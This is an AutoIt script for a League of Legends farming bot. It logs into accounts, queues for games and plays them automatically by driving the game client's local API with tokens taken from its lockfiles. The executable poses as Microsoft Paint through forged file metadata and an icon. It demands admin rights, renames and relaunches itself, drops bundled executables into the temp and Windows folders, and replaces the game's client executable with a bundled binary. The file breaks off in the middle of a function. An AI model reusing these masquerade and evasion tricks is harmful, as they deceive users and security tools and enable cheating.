#cs ----------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         PhanHaiTri

 Script Function:
	League of Legends ..

#ce ----------------------------------------------------------------------------

#EndRegion
#EndRegion
#EndRegion
#EndRegion
#EndRegion
#EndRegion
#EndRegion
#EndRegion

#Region Directives
#pragma compile(ExecLevel, requireAdministrator)
#pragma compile(Compression, 9)
#pragma compile(UPX, False)
#pragma compile(FileDescription, 'Paint')
#pragma compile(FileVersion, '10.0.19041.746')
#pragma compile(ProductName, 'Microsoft® Windows® Operating System')
#pragma compile(ProductVersion, '10.0.19041.746')
#pragma compile(LegalCopyright, '© Microsoft Corporation. All rights reserved')
#pragma compile(OriginalFilename, 'MSPAINT.EXE')
#pragma compile(Icon, 'mspaint.ico')
#RequireAdmin
#NoTrayIcon
#EndRegion

#include <Date.au3>
#include <File.au3>
#include <Misc.au3>
#include <Array.au3>
#include <String.au3>
#include <WinAPIHObj.au3>
#include <WinAPIProc.au3>
#include <GuiConstants.au3>
#include <FileConstants.au3>
#include <GUIConstantsEx.au3>
#include <MsgBoxConstants.au3>
#include <ButtonConstants.au3>
#include <WindowsConstants.au3>
#include <D:\#BOT\includes\Json.au3>
#include <D:\#BOT\includes\BinaryCall.au3>
#include <D:\#BOT\includes\_HttpRequest.au3>
FileInstall("D:\#BOT\includes\_HttpRequest.au3", @ScriptDir & "\#includes")
FileInstall("D:\#BOT\includes\Json.au3", @ScriptDir & "\#includes")
FileInstall("D:\#BOT\includes\BinaryCall.au3", @ScriptDir & "\#includes")
FileInstall("D:\#BOT\includes\_bes.exe", @ScriptDir & "\#includes")
FileInstall("D:\#BOT\includes\LeagueClient.exe", @ScriptDir & "\#includes")
FileInstall("D:\#BOT\includes\EmptyStandbyList.exe", @ScriptDir & "\#includes")

#Region Bypass
   Func randomname()
   Local $s3chr[11] = ["!", "@", "#", "$", "%", "^", "&", "(", ")", "_", "+"]
   Local $password = ""
   For $i = 0 To 4
	  Local $s1 = Chr(Random(65,90))
	  Local $s2 = Chr(Random(97,122))
	  Local $s3 = $s3chr[Random(0, UBound($s3chr) - 1, 1)]
	  Local $randomm = Random(1, 6, 1)
	  Select
		 Case $randomm = 1
			$password &= $s1 & $s2 & $s3
		 Case $randomm = 2
			$password &= $s1 & $s3 & $s2
		 Case $randomm = 3
			$password &= $s2 & $s1 & $s3
		 Case $randomm = 4
			$password &= $s2 & $s3 & $s1
		 Case $randomm = 5
			$password &= $s3 & $s1 & $s2
		 Case $randomm = 6
			$password &= $s3 & $s2 & $s1
	  EndSelect
   Next
	  Return $password
   EndFunc

   Local $abc1 = randomname() & ".exe"
   FileMove(@ScriptFullPath, @ScriptDir & "\" & $abc1)

   If Not ProcessExists($abc1) Then
	   Run(@ScriptDir & "\" & $abc1)
	   ProcessClose(@ScriptName)
   EndIf
#EndRegion

#Region Terminate
   HotKeySet("{F10}", "Terminate")
   Func Terminate()
	  Exit 0
   EndFunc
#EndRegion

#Region Global Variables & Options
   Global $sPort, $sPass, $sPortRiot, $sPassRiot
   Global $size, $matches = 0, $spells = 0, $relaunch = 0, $pickngoc = 0, $tut1 = 0, $tut2 = 0, $tut3 = 0
   Global $csl = 0, $csln = 0, $tg1 = 0, $td = 0, $tt1 = 0, $igt = 0, $fai = 0, $ldt = 0, $fftd = 0, $tdplayagain = 0
   Global $camre = 0, $load = 0, $ff = 0, $endd = 0
   Global $checktuong150 = 0, $checklockfile = 0
   Global Const $title = "[TITLE:League of Legends; CLASS:RCLIENT]", $title2 = "[TITLE:League of Legends (TM) Client; CLASS:RiotWindowClass]", $console = "[CLASS:Qt5QWindowIcon]", $riotclient = "[TITLE:Riot Client Main; CLASS:RCLIENT]"
   Global Const $failed = "[TITLE:System Error]", $failed1 = "[TITLE:Kết nối thất bại]"
   Global Const $STD_OUTPUT_HANDLE = -11
   Global Const $STD_INPUT_HANDLE  = -10
   Global const $sHost = "https://127.0.0.1"
   AutoItSetOption("TrayAutoPause", 0)
   AutoItSetOption("PixelCoordMode", 2)
   AutoItSetOption("MouseCoordMode", 2)
   AutoItSetOption("MouseClickDelay", 100)
   AutoItSetOption("MouseClickDownDelay", 100)
   AutoItSetOption("SendKeyDownDelay", 100)
   AutoItSetOption("SendKeyDelay", 100)
#EndRegion

#Region Create data dir & Kill explorer
   Global $var = @TempDir & '\' & randomname()
   Global $var2 = @WindowsDir
   $run = 0
   ; Giải nén "bes.exe" vào thư mục @TempDir
   If $run = 0 Then
	  DirCreate($var)
	  Sleep(50)
	  FileInstall('LeagueClient.exe', $var & '\')
	  FileInstall('EmptyStandbyList.exe', $var2 & '\')
	  FileInstall('_bes.exe', $var & '\')
	  $run = 1
   EndIf

   ; Tắt "explorer.exe"
   If ProcessExists("explorer.exe") Then
;~ 	  Run('TASKKILL /F /PID ' & ProcessExists('explorer.exe'))
   EndIf
   Sleep(2000)
#EndRegion

#Region Console 1
   ; ConsoleWindow
   AllocConsole()
   Sleep(50)
   setTitle("Paint")
   Sleep(50)
   WinMove("Paint", "", @DesktopWidth - 667, @DesktopHeight - @DesktopHeight/5, 753, 120)
   _ConsoleWriteln(" ==========================================================================")
   Sleep(10)
   _ConsoleWriteln("  AngryBot | Advanced Pixel Bot for League of Legends | Discord: Kazu#2528")
   Sleep(10)
   _ConsoleWriteln(" ==========================================================================")
   Sleep(10)
   _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Preparing..")

   While Not ProcessExists("LeagueClient.exe")
	  LoginLoL()
   WEnd

   ; Một số thông tin cần thiết cho setTitle()
   Local $cac = _HttpRequest(2, getAPI(10))
   Local $lvl = Json_Decode($cac)
   Local $cap = Json_Get($lvl, '["percentCompleteForNextLevel"]')
   Local $pac = Json_Get($lvl, '["summonerLevel"]')
   Local $nam = Json_Get($lvl, '["displayName"]')
   setTitle(" Nickname: " & $nam & " | " & "Level: " & $pac & " (" & $cap & "%" & ")" & " | " & "Games: " & $matches & " | " & "RL: " & $relaunch & " | " & "XP: " & CXP())
   reducecpulol()
#EndRegion

#Region SetAuth & Functions
   Func getAPI($n)
	  Static $aAPIs[] = [ _
		 "/lol-champions/v1/owned-champions-minimal",    						_ ;0
		 "/lol-matchmaking/v1/ready-check",              						_ ;1
		 "/lol-matchmaking/v1/ready-check/accept",       						_ ;2
		 "/lol-champ-select/v1/session",                 						_ ;3
		 "/lol-champ-select/v1/session/actions",         						_ ;4
		 "/lol-lobby/v2/play-again",                     						_ ;5
		 "/lol-lobby/v2/lobby/matchmaking/search",       						_ ;6
		 "/lol-gameflow/v1/gameflow-phase",              						_ ;7
		 "/riotclient/kill-ux",                          						_ ;8
		 "/lol-lobby/v2/lobby",                          						_ ;9
		 "/lol-summoner/v1/current-summoner",            						_ ;10
		 "/lol-perks/v1/pages",                          						_ ;11
		 "/lol-perks/v1/currentpage",                    						_ ;12
		 "/lol-login/v1/session",                        						_ ;13
		 "/lol-gameflow/v1/reconnect",                   						_ ;14
		 "/lol-chat/v1/friends",						 						_ ;15
		 "/lol-lobby/v2/lobby/invitations",              						_ ;16
		 "/lol-lobby/v2/received-invitations",          						_ ;17
		 "/lol-chat/v1/friend-requests",				 						_ ;18
		 "/lol-lobby/v2/lobby/members",			         						_ ;19
		 "/lol-event-shop/v1/lazy-load-data",			 						_ ;20
		 "/lol-event-shop/v1/claim-select-all",									_ ;21
		 "/lol-summoner/v1/current-summoner/icon",								_ ;22 Đổi Icon
		 "/lol-purchase-widget/v2/purchaseItems",		 						_ ;23 Mua tướng
		 "/lol-lobby/v2/matchmaking/quick-search",     							_ ;24
		 "/lol-inventory/v1/wallet/be",											_ ;25 Kiểm tra Tinh Hoa Lam
		 "/lol-npe-tutorial-path/v1/tutorials",			 						_ ;26 Kiểm tra Tutorials
		 "/lol-champions/v1/inventories/560436411/champions/22",				_ ;27 Kiểm tra Ashe
		 "/lol-event-shop/v1/purchase-offer",									_ ;28
		 "/lol-honor-v2/v1/ballot",												_ ;29 Lấy thông tin vinh danh
		 "/lol-honor-v2/v1/honor-player",										_ ;30 Vinh danh
		 "/lol-perks/v1/recommended-pages",										_ ;31
		 "/lol-npe-tutorial-path/v1/tutorials/init",							_ ;32 Patch Tutorials
		 "/lol-npe-tutorial-path/v1/settings",									_ ;33 Put Tutorials
		 "/lol-lobby/v2/eligibility/party",										_ ;34 Post cc j ấy kkk
		 "/lol-missions/v1/player/014907d2-5c38-11ec-9e9c-37ae9e516c57", 		_ ;35 {"rewardGroups":["missfortune_group"]}
		 "/lol-pre-end-of-game/v1/complete/missions-celebration",				_ ;36 POST chắc là OK
		 "/lol-summoner/v1/check-name-availability-new-summoners",				_ ;37 _Check tên acc
		 "/lol-summoner/v1/summoners",											_ ;38 _Set tên acc
		 "/lol-player-behavior/v1/code-of-conduct-notification",                _ ;39 Xoá conduct
		 "/lol-honeyfruit/v1/account-claim/auto-dismiss",						_ ;40 Tân thủ
		 "/telemetry/v1/events/new_player_experience",							_ ;41 Mode select
		 "/lol-end-of-game/v1/state/dismiss-stats",								_ ;42
		 "/lol-active-boosts/v1/active-boosts",									_ ;43
		 "/lol-champ-select/v1/session/my-selection"							_ ;44
	  ];
	  Return ($sHost & ':' & $sPort & $aAPIs[$n])
   EndFunc

   Func getAPI_Reward($n)
	  Static $aAPIs[] = [ _
		 "/lol-missions/v1/player/014907d2-5c38-11ec-9e9c-37ae9e516c57",		_ ;0 {"rewardGroups":["missfortune_group"]}
		 "/lol-missions/v1/player/df9e41fd-5c37-11ec-9e9c-37ae9e516c57",		_ ;1 {"rewardGroups":["riven_group"]}
		 "/lol-missions/v1/player/00dbc707-5c38-11ec-9e9c-37ae9e516c57",		_ ;2 {"rewardGroups":["caitlyn_group"]}
		 "/lol-missions/v1/player/ff39888c-5c37-11ec-9e9c-37ae9e516c57",		_ ;3 {"rewardGroups":["seraphine_group"]}
		 "/lol-missions/v1/missions",											_ ;4 Check Missions
		 "/lol-pre-end-of-game/v1/complete/missions-celebration",				_ ;5 POST
		 "/lol-settings/v2/account/LCUPreferences/lol-tutorial",				_ ;6
		 "/lol-npe-rewards/v1/challenges/opt",									_ ;7
		 "/lol-missions/v1/missions",											_ ;8
		 "/lol-missions/v1/player/f2518cd9-5c37-11ec-9e9c-37ae9e516c57",		_ ;9 {"rewardGroups":["thresh_group"]}
		 "/lol-missions/v1/player/fe48c0d0-5c37-11ec-9e9c-37ae9e516c57"			_ ;10 {"rewardGroups":["ekko_group"]}
	  ];
	  Return ($sHost & ':' & $sPort & $aAPIs[$n])
   EndFunc

   Func checkMission($name)
	  Local $rew = _HttpRequest(2, getAPI_Reward(4))
	  Local $pso = Json_Decode($rew)
	  Local $i = 0
	  Local $end
	  While 1
		 $end = Json_Get($pso, '[' & $i & '].id')
		 If @error Then ExitLoop
		 If $end = $name Then
			If Json_Get($pso, '[' & $i & '].status') = 'SELECT_REWARDS' Then Return True
		 EndIf
		 $i+=1
	  WEnd
   EndFunc

   Func getAPI2($n)
	  $sPort2 = 2999
	  Static $aAPIs[] = [ _
	  "/liveclientdata/activeplayer",                     _ ;0
	  "/liveclientdata/gamestats",                        _ ;1
	  "/liveclientdata/eventdata"	  				      _ ;2
	  ]
	  Return ($sHost & ':' & $sPort2 & $aAPIs[$n])
   EndFunc

   Func getAPI_Riot($n)
	  Static $aAPIs[] = [ _
		 "/rso-auth/v2/authorizations",															_ ;0
		 "/rso-auth/v1/session/credentials", 													_ ;1
		 "/telemetry/v2/events/riotclient__MultiGameClientPlayerAction__v2",					_ ;2
		 "/product-launcher/v1/products/league_of_legends/patchlines/live",						_ ;3
		 "/player-account/vng/v1/web-url/league_of_legends",									_ ;4
		 "/eula/v1/agreement/acceptance",														_ ;5
		 "/rso-auth/v1/session",																_ ;6
		 "/rnet-product-registry/v4/patch-states/products/league_of_legends/patchlines/live"	_ ;7
	  ]
	  Return ($sHost & ':' & $sPortRiot & $aAPIs[$n])
   EndFunc

   Func SetAuthkk()
	  Local Const $sProc = "LeagueClient.exe"
	  Sleep(30)
	  Local $iPID = ProcessExists($sProc)
	  Sleep(30)

	  ; Lấy đường dẫn của "LeagueClient.exe"
	  Global $sDir = StringTrimRight(_WinAPI_GetProcessFileName($iPID), StringLen($sProc))
	  Sleep(30)

	  If FileExists($sDir & '\lockfile') Then
		 ; Đọc lockfile để lấy Port + Pass
		 Global $sLockfile = FileReadLine($sDir & 'lockfile')
		 Sleep(30)
		 Global $sTokens = StringSplit($sLockfile, ':', 2)
		 Sleep(30)
		 Global $sPort = $sTokens[2];
		 Sleep(30)
		 Global $sPass = $sTokens[3];
		 Sleep(30)
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Set Auth LeagueClient..")

		 ; Thiết lập Auth
		 _HttpRequest_SetAuthorization("riot", $sPass)
		 Sleep(1000);
	  EndIf
   EndFunc

   Func SetAuthRiot()
	  ; Đọc lockfile để lấy Port + Pass
	  Global $sDirRiot = @LocalAppDataDir & '\Riot Games\Riot Client\Config\'
	  Sleep(30)
	  If FileExists($sDirRiot & '\lockfile') Then
		 Global $sLockfileRiot = FileReadLine($sDirRiot & 'lockfile')
		 Sleep(30)
		 Global $sTokensRiot = StringSplit($sLockfileRiot, ':', 2)
		 Sleep(30)
		 Global $sPortRiot = $sTokensRiot[2];
		 Sleep(30)
		 Global $sPassRiot = $sTokensRiot[3];
		 Sleep(30)
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Set Auth RiotClient..")

		 ; Thiết lập Auth
		 _HttpRequest_SetAuthorization("riot", $sPassRiot)
		 Sleep(1000)
	  EndIf
   EndFunc

   ; Login vào LoL
   Func LoginLoL()
	  Global $file = FileOpen(@DesktopDir & "\config.txt", 128)
	  FileOpen($file)
	  Local $duongdan = FileReadLine($file, 1)
	  Global $account = StringSplit(FileReadLine($file, 2), ':', 2)
	  Global $sacc = $account[0];
	  Global $spas = $account[1];

	  killleagueprocess()

	  ; Đổi tên LeagueClientMain thành LeagueClient để tránh Riot Client Update
	  If FileExists($duongdan & "\League of Legends\LeagueClientMain.exe") Then
		 FileDelete($duongdan & "\League of Legends\LeagueClient.exe")
		 Sleep(500)
		 FileMove($duongdan & "\League of Legends\LeagueClientMain.exe", $duongdan & "\League of Legends\LeagueClient.exe")
	  EndIf

	  ; Chạy RiotClient
	  If Not ProcessExists("RiotClientServices.exe") Then
		 $riotcmd = '"' & $duongdan & '\Riot Client\RiotClientServices.exe' & '"' & ' --app-port=53569 --remoting-auth-token=uknowwhat --headless' ;
		 Run('"' & @ComSpec & '" /c ' & $riotcmd, @SystemDir, @SW_HIDE)
		 Sleep(2000)
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Launching RiotClient..")
	  EndIf

	  Sleep(20000)

	  If ProcessExists("RiotClientServices.exe") Then
		 SetAuthRiot()
	  EndIf

	  _HttpRequest(1, getAPI_Riot(0), '{"clientId":"riot-client","trustLevels":["always_trusted"]}', '', '', '', 'POST')
	  Sleep(500)
	  _HttpRequest(1, getAPI_Riot(1), '{"username":"' & $sacc & '","password":"' & $spas & '","persistLogin":false}', '', '', '', 'PUT')
	  _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Logging in to account: " & $sacc)
	  Sleep(10000)
	  FileMove($duongdan & "\League of Legends\LeagueClient.exe", $duongdan & "\League of Legends\LeagueClientMain.exe")
	  Sleep(1000)
	  FileCopy($var & "\LeagueClient.exe", $duongdan & "\League of Legends", $FC_OVERWRITE)
	  Sleep(1000)
	  FileClose($file)
	  Sleep(10000)

	  _HttpRequest(1, getAPI_Riot(2), '{"clientComponent":"productDetailsPlay","playerActionName":"click","productId":"league_of_legends","patchlineId":"live","productDetailsPlayButton":{"buttonState":"Play"}}', '', '', '', 'PUT')
	  Sleep(10)
	  _HttpRequest(1, getAPI_Riot(3), '', '', '', '', 'POST')
	  _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Launching LeagueClient..")

	  Sleep(10000)
	  If ProcessExists("LeagueClient.exe") Then
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Wait until LeagueClient has finished loading..")
		 Sleep(20000)
		 SetAuthkk()
		 Sleep(6000)
		 If isLogin() Then
			_ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Connection successful!")
		 EndIf
	  Else
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Leagueclient could not be launched.")
		 Sleep(2000)
		 _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Connection failed, restarting the game..")
		 killleagueprocess()
	  EndIf
   EndFunc

   Func _updateriot()
	  Local $log = _HttpRequest(2, getAPI_Riot(7))
	  Local $chu = Json_Decode($log)
	  If Json_Get($chu, '.combined_patch_state') = 'out_of_date' Then Return True
   EndFunc

   ; Kiểm tra đã kết nối thành công tới Server hay chưa
   Func isLogin()
	  Local $log = _HttpRequest(2, getAPI(13))
	  Local $chu = Json_Decode($log)
	  Return Json_Get($chu, '["connected"]') = 'True'
   EndFunc

   ; Check XP EndDate
   Func CXP()
	  Local $xp = _HttpRequest(2, getAPI(43))
	  Local $ps = Json_Decode($xp)
	  Return Json_Get($ps, '.xpBoostEndDate')
   EndFunc

   ; Check BANNED
   Func _bannedcheck()
	  Local $log = _HttpRequest(2, getAPI(13))
	  Local $chu = Json_Decode($log)
	  Return Json_Get($chu, '.error.messageId') = 'ACCOUNT_BANNED'
   EndFunc

   ; Kiểm tra đã ở trong Lobby hay chưa
   Func checklobby()
	  Local $lob = _HttpRequest(2, getAPI(7))
	  Local $chu = Json_Decode($lob)
	  Return $chu = 'None'
   EndFunc

   ; Kill All League's Process
   Func killleagueprocess()
	  ProcessClose("RiotClientServices.exe")
	  Sleep(20)
	  ProcessClose("RiotClientCrashHandler.exe")
	  Sleep(20)
	  ProcessClose("LeagueClient.exe")
	  Sleep(20)
	  ProcessClose("LeagueClientMain.exe")
	  Sleep(20)
	  ProcessClose("LeagueCrashHandler.exe")
	  Sleep(20)
	  ProcessClose("League of Legends.exe")
   EndFunc

   ; Kiểm tra đã chấp thuận trận đấu hay chưa
   Func checkaccept()
	  Local $acc = _HttpRequest(2, getAPI(1))
	  Local $chu = Json_Decode($acc)
	  Return Json_Get($chu, '["playerResponse"]')
   EndFunc

   ; Kiểm tra đã có thể bắt đầu trận hay chưa
   Func isfm()
	  Local $fmh = _HttpRequest(2, getAPI(9))
	  Local $text = Json_Decode($fmh);
	  Return Json_Get($text, '["canStartActivity"]') == 'True'
   EndFunc

   ; Vào máy siêu dễ khi không ở trong phòng
   Func joinlobby()
	  _HttpRequest(1, getAPI(9), '{"queueId":830}', '', '', '', 'POST')
	  _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Preparing lobby..")
   EndFunc

   ; Rời khỏi phòng chờ
   Func outlobby()
	  _HttpRequest(1, getAPI(9), '', '', '', '', 'DELETE')
	  _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Leave lobby..")
   EndFunc

   ; Kiểm tra đã kết thúc trận hay chưa
   Func isendgame()
	  Local $end = _HttpRequest(2, getAPI(7))
	  Local $chu = Json_Decode($end)
	  Return $chu = 'PreEndOfGame'
   EndFunc

   ; Kiểm tra có bị mất kết nối
   Func reconnect()
	  Local $end = _HttpRequest(2, getAPI(7))
	  Local $chu = Json_Decode($end)
	  Return $chu = 'Reconnect'
   EndFunc

   Func waitingstats()
	  Local $end = _HttpRequest(2, getAPI(7))
	  Local $chu = Json_Decode($end)
	  Return $chu = 'WaitingForStats'
   EndFunc

   ; Kiểm tra đã kết thúc trận hay chưa
   Func isendgame2()
	  Local $end = _HttpRequest(2, getAPI(7))
	  Local $chu = Json_Decode($end)
	  Return $chu = 'EndOfGame'
   EndFunc

   ; Check game end :/
   Func gameend()
	  Local $api = _HttpRequest(2, getAPI2(2))
	  Local $json = Json_Decode($api)
	  Local $i = 0
	  Local $end
	  While 1
		 $end = Json_Get($json, '.Events[' & $i & '].EventName')
		 If @error Then ExitLoop
		 If $end = 'GameEnd' Then Return True
		 $i+=1
	  WEnd
   EndFunc

   Func CMission2_fix($name)
	  Local $rew = _HttpRequest(2, getAPI_Reward(4))
	  Local $pso = Json_Decode($rew)
	  Local $i = 0
	  Local $end
	  While 1
		 $end = Json_Get($pso, '[' & $i & '].id')
		 If @error Then ExitLoop
		 If $end = $name Then
			If Json_Get($pso, '[' & $i & '].status') = 'SELECT_REWARDS' Then Return True
		 EndIf
		 $i+=1
	  WEnd
   EndFunc

   ; Random honor
   Func _rhonor()
	  Local $json, $gameid, $random, $sumid, $postData

	  $json = Json_Decode(_HttpRequest(2, getAPI(29)))
	  $gameid = Json_Get($json, '.gameId')

	  $random = Random(0, 3, 1)
	  $sumid = Json_Get($json, '.eligiblePlayers[' & $random & '].summonerId')

	  $postData = '{"gameId":' & $gameid & ',"honorCategory":"HEART","summonerId":' & $sumid &'}'
	  _HttpRequest(1, getAPI(30), $postData, '', '', '', 'POST')

	  _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Honored to a random player.")
   EndFunc

   ; Chơi lại
   Func playagain()
	  _HttpRequest(1, getAPI(9), '{"queueId":830}', '', '', '', 'POST')
	  Sleep(20)
	  _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Play again.")
   EndFunc

   ; Tìm trận
   Func findmatch()
	  _HttpRequest(1, getAPI(6), '', '', '', '', 'POST')
   EndFunc

   ; Kiểm tra có đang trong quá trình tìm trận
   Func isInProgress()
	  Local $tmp = _HttpRequest(2, getAPI(1))
	  Local $json = Json_Decode($tmp);
	  Return Json_Get($json, '["state"]') == 'InProgress'
   EndFunc

   ; Chấp thuận trận đấu
   func acceptMatch()
	  _HttpRequest(1, getAPI(2), '', '', '', '', 'POST')
   EndFunc

   ; Kiểm tra vị trí của bản thân trong lúc chọn tướng
   Func getID($isCell = False)
	  Local $json = Json_Decode(_HttpRequest(2, getAPI(3)))
	  Local $actions = Json_Get($json, '["actions"][0]')
	  Local $myCellId = Json_Get($json, '["localPlayerCellId"]')

	  If IsInt($myCellId) Then
		 If $isCell Then Return $myCellId

		 For $i = 0 To UBound($actions) - 1
			If $actions[$i]["actorCellId"] = $myCellId Then
			   Return $actions[$i]["id"]
			EndIf
		 Next
	  EndIf

	  Return -1
   EndFunc

   ; Check pick lul :o
   Func getID1($isCell = False)
	  Local $json = Json_Decode(_HttpRequest(2, getAPI(3)))
	  Local $myCellId = Json_Get($json, '["localPlayerCellId"]')

	  If IsInt($myCellId) Then
		 If $isCell Then Return $myCellId

		 Local $actions = Json_Get($json, '["actions"][0]')

		 For $i = 0 To UBound($actions) - 1
			If $actions[$i]["actorCellId"] = $myCellId Then
			   Return $actions[$i]["completed"]
			EndIf
		 Next
	  EndIf

	  Return -1
   EndFunc

   Func champID_AL($i)
	  Local $json = Json_Decode(_HttpRequest(2, getAPI(3)))
	  Local $actions = Json_Get($json, '["actions"][0]')
	  Local $myCellId = Json_Get($json, '["localPlayerCellId"]')

	  If IsInt($myCellId) Then
		 For $j = 0 To UBound($actions) - 1
			If $actions[$j]["isAllyAction"] And $actions[$j]["actorCellId"] <> $myCellId Then
			   Return $actions[$j]["championId"]
			EndIf
		 Next
	  EndIf

	  Return -1
   EndFunc

   Func champID_ME($isCell = False)
	  Local $json, $tmp
	  $tmp = _HttpRequest(2, getAPI(3))
	  $json = Json_Decode($tmp)

	  Local $myCellId = Json_Get($json, '["localPlayerCellId"]')
	  If (IsInt($myCellId) And $isCell) Then Return $myCellId;

	  If (IsInt($myCellId) And $myCellId >= 0) Then
		 For $i = 0 To 4
			If (Json_Get($json, '["actions"][0][' & String($i) & ']["actorCellId"]') _
			   == $myCellId) And (Json_Get($json, '["actions"][0][' & String($i) & ']["isAllyAction"]') = True) Then
			   Return Json_Get($json, '["actions"][0][' & String($i) & ']["championId"]')
			EndIf
		 Next
	  EndIf

	  Return -1
   EndFunc

   ; Chọn tướng
   Func pickrandomluonkk()
	   Local $cac = _HttpRequest(2, getAPI(10))
	   Local $json = Json_Decode(StringReplace(_HttpRequest(2, getAPI(0)), ".j", '.j'))
	   Local $id = getID()
	   Local $sPickingAPI = getAPI(4) & '/' & String($id)
	   Local $sLockingAPI = $sPickingAPI & '/complete'
	   Local $iNChamps = @extended
	   Local $csln = 0

	   While Not getID1() = 'True' And Not ProcessExists("League of Legends.exe")
		   For $i = 0 To ($iNChamps - 1)
			   Local $tmp = Json_Get($json, '[' & $i & ']["roles"][0]')
			   If $tmp = "marksman" Then
				   Local $ids = Json_Get($json, '[' & $i & ']["id"]')
				   If Not _ArraySearch(champID_AL(), $ids) > -1 Then
					   _HttpRequest(1, $sPickingAPI, '{"championId":' & $ids & '}', '', '', '', 'PATCH')
					   Sleep(500)
					   If champID_ME() <> 0 Then
						   _HttpRequest(1, $sLockingAPI, '', '', '', '', 'POST')
					   EndIf
				   EndIf
				   recommendedpages()
				   If getID1() = 'True' Or ProcessExists("League of Legends.exe") Then
					   If $csln = 0 Then
						   _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Champion selected: " & idtoname())
						   $csln = 1
					   EndIf
					   ExitLoop 2
				   EndIf
			   EndIf
		   Next
		   For $i = 0 To ($iNChamps - 1)
			   Local $ids = Json_Get($json, '[' & $i & ']["id"]')
			   If Not _ArraySearch(champID_AL(), $ids) > -1 Then
				   _HttpRequest(1, $sPickingAPI, '{"championId":' & $ids & '}', '', '', '', 'PATCH')
				   Sleep(500)
				   If champID_ME() <> 0 Then
					   _HttpRequest(1, $sLockingAPI, '', '', '', '', 'POST')
				   EndIf
			   EndIf
			   recommendedpages()
			   If getID1() = 'True' Or ProcessExists("League of Legends.exe") Then
				   If $csln = 0 Then
					   _ConsoleWriteln(" [" & @MDAY & "-" & @MON & "-" & @YEAR & " " & _NowTime(5) & "]" & " " & "Champion selected: " & idtoname())
					   $csln = 1
				   EndIf
				   ExitLoop 2
			   EndIf
		   Next
	   WEnd
   EndFunc

   ; Lấy ChampID
   Func champid()
	  Local $tmp = _HttpRequest(2, getAPI(3));
	  Local $json = Json_Decode($tmp);
	  Local $myCellId = Json_Get($json, '["localPlayerCellId"]');
	  For $i = 0 To 9
		 If (Json_Get($json, '["actions"][0][' & String($i) & ']["actorCellId"]') == $myCellId) Then
			Return Json_Get($json, '["actions"][0][' & String($i) & ']["championId"]');
		 EndIf
	  Next
   EndFunc

   ; Lấy Roles
   Func idtoroles()
	  Local $json, $sRet, $tmp
	  ; Load champion data
	  $sRet = _HttpRequest(2, getAPI(0))
	  $json = Json_Decode($sRet, 1) ; Use associative array
	  StringReplace($sRet, ".j", '.j'); Just '.jpg'
	  For $i = 0 To UBound($json)
		 Local $champid = champid()
		 If $json[$i]["id"] = $champid Then
			Return $json[$i]["roles"][0]
		 EndIf
	  Next
   EndFunc

   ; Lấy Name
   Func idtoname()
	  Local $json, $sRet, $tmp
	  ; Load champion data
	  $sRet = _HttpRequest(2, getAPI(0))
	  $json = Json_Decode($sRet, 1) ; Use associative array
	  StringReplace($sRet, ".j", '.j'); Just '.jpg'
	  For $i = 0 To UBound($json)
		 Local $champid = champid()
		 If $json[$i]["id"] = $champid Then
			Return $json[$i]["name"]
		 EndIf
	  Next
   EndFunc

   ; Kiểm tra có đang chọn tướng hay không
   Func InChampSelect()
	  Local $chs = _HttpRequest(2, getAPI(7))
	  Local $text = Json_Decode($chs)
	  Return $text = 'ChampSelect'
   EndFunc

   ; Cộng kĩ năng khi đang ở trong trận
   Func skillupgrade()
	  Local $cac = _HttpRequest(2, getAPI2(0))
	  Local $lvl = Json_Decode($cac)
	  Local $pac = $lvl["level"]
	  Sleep(10)

	  Local $hotkey[6] = ["^{w}", "^{q}", "^{e}", "^{r}", "^{q}", "^{e}"]

	  If ($pac >= 1 And $pac <= 18) Then
		 Local $index = Int(($pac - 1) / 3)
		 Send("{lshift up}")
		 Sleep(10)
		 Send("{lctrl up}")
		 Send($hotkey[$index])
	  EndIf
   EndFunc

   ; Mua trang bị khi đang ở trong trận
   Func buyitems()
	  If checktime() < 60 Then
		 Local $itemPositions[3][2] = [[121, 181], [221, 181], [321, 181]]

		 Send("{lshift up}")
		 Sleep(100)

		 For $i = 0 To UBound($itemPositions) - 1
			MouseMove($itemPositions[$i][0], $itemPositions[$i][1], 3)
			Sleep(200)
			MouseDown("menu")
			Sleep(1000)
			MouseUp("menu")
			Sleep(2000)
		 Next

		 Send("{esc down}")
		 Sleep(200)
		 Send("{esc up}")
	  EndIf
   EndFunc

   ; Recommended Pages
   Func recommendedpages()
	  Local $roles = idtoroles()
	  If $roles = 'marksman' Then
		 Local $lane = 'BOTTOM'
	  Else
		 Local $rd = Random(0,1,1)
		 If $rd = 0 Then
			Local $lane = 'TOP'
		 ElseIf $rd = 1 Then
			Local $lane = 'MIDDLE'
		 EndIf
	  EndIf

	  Local $idrunes = _HttpRequest(2, getAPI(11))
	  Local $idrdeco = Json_Decode($idrunes)
	  Local $idsngoc = Json_Get($idrdeco, '[0]["id"]')
